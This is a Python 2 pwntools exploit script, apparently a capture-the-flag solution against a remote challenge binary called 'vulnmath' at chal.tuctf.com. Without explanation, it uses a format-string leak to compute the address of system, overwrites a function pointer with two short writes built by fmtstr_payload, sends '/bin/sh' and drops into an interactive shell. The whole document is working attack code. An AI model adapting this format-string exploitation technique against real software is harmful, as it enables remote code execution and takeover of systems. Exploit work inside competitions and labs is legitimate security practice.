#!/usr/bin/env python2

from pwn import *

#context.log_level = 'debug'

#p = process('./vulnmath')

context.binary='./vulnmath'
context.bits=32

#gdb.attach(p)
p = remote('chal.tuctf.com', 30502)

#p.sendlineafter(' is ', '%29$x')
#stack = int(p.recvuntil('What').split('\n')[2], 16)
p.sendlineafter(' is ','/bin/sh\x00')

p.sendlineafter(' is ', '%27$x')
heap = int(p.recvuntil('What').split('\n')[2], 16) - 0x0001efb9  #0x18e81

system = heap+0x458b0  # +0x000458b0  #0x3d200
f2 = hex(system)[2:6]
l2 = hex(system)[6:10]
f2=(int(f2,16))
l2=(int(l2,16))
#0x804c016, 014
writes2 = {0x0804c016:f2}
writes = {0x0804c014:l2}
#print(hex(stack))
print(hex(heap+0x18e81))
print(hex(system))

payload = fmtstr_payload(6,writes,numbwritten=0,write_size='short')
print payload
p.sendlineafter(' is ',payload)

payload2 = fmtstr_payload(6,writes2,numbwritten=0,write_size='short')
print payload2
p.sendlineafter(' is ',payload2)

payload3='/bin/sh\x00'

print payload3
p.sendlineafter(' is ',payload3)

p.sendlineafter(' is ',payload3)

p.interactive()

